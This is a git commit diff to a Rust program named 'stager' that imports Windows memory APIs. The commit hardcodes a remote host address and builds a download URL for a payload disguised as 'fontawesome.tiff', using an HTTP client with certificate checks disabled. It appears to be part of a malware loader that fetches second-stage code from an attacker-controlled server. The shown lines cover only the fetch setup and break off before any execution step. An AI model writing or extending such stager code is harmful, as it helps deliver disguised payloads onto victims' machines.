dec595c45950b03465f395176c8c364189a58bd6
KickedDroid <24928676+KickedDroid@users.noreply.github.com>
2026-05-29 20:33:20 -0500

    Update main.rs

--- rust/stager/src/main.rs
+++ rust/stager/src/main.rs
@@ -10,12 +10,10 @@ use windows::Win32::System::Memory::{
 use zeroize::Zeroize;
 
 fn main() -> Result<(), Error> {
-    let args: Vec<String> = std::env::args().collect();
-
     let target = "192.168.122.227:8081";
 
     //println!("{}, {}", args[0], args[1]);
-    let mut url = format!("http://{}/fontawesome.tiff", args[1]);
+    let mut url = format!("http://{}/fontawesome.tiff", target);
 
     let client = reqwest::blocking::Client::builder()
         .danger_accept_invalid_certs(true)
